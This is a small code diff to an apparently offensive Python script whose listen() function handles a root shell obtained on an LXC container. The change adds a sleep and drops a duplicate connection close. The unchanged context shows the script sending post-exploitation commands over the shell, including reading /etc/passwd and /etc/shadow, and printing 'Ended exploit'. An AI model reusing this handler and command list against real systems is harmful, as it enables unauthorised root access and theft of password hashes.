@@ -93,6 +93,7 @@ def listen(ip,port, t2, r_port, file_name, general_info, arguments):
 				print("")
 		else:
 			# Do some random commands while root on the lxc container
+			time.sleep(0.5)
 			commands = ['pwd\n', 'ls -la\n', 'whoami\n', 'ls -la | grep root | awk \'{ print $9 }\' | head -1 \n', 'which php\n', 'cat /etc/passwd\n', 'cat /etc/shadow\n']
 			for cmd in commands:
 				ans = recvall(conn)
@@ -105,7 +106,6 @@ def listen(ip,port, t2, r_port, file_name, general_info, arguments):
 			time.sleep(0.2)
 			conn.close()
 			s.close()
-			conn.close()
 			print('[*] Ended exploit')
 			
 	except KeyboardInterrupt:
